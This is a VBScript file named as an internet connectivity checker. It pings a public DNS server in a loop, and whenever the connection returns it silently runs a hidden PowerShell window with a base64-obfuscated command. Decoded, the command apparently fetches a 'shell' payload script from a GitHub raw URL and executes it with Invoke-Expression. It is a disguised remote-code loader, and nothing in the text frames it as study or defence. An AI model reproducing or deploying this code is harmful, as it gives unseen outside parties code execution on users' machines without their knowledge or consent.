' CheckInternet.vbs

Dim objShell, wasConnected
Set objShell = CreateObject("WScript.Shell")
wasConnected = False

encodedCommand = "SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9hbmFwcml2YXRlL3dhdGNofGFuZ3BheWxvYWRzL3JlZnMvSGVhZHMvbWFpbi9zaGVsbCcgLVVzZUJhc2ljUGFyc2luZyB8IEludm9rZS1FeHByZXNzaW9u"

Do
    Dim pingResult
    pingResult = False

    ' Ping 8.8.8.8 once
    Set ping = GetObject("winmgmts:{impersonationLevel=impersonate}").ExecQuery _
        ("select * from Win32_PingStatus where address = '8.8.8.8' and timeout = 1000")

    For Each reply In ping
        If reply.StatusCode = 0 Then
            pingResult = True
        End If
    Next

    If pingResult = True And wasConnected = False Then
        ' Internet just connected, run encoded powershell silently
        objShell.Run "powershell.exe -EncodedCommand " & encodedCommand, 0, False
        wasConnected = True
    ElseIf pingResult = False Then
        ' Internet disconnected
        wasConnected = False
    End If

    WScript.Sleep 5000 ' Wait 5 seconds before next check
Loop
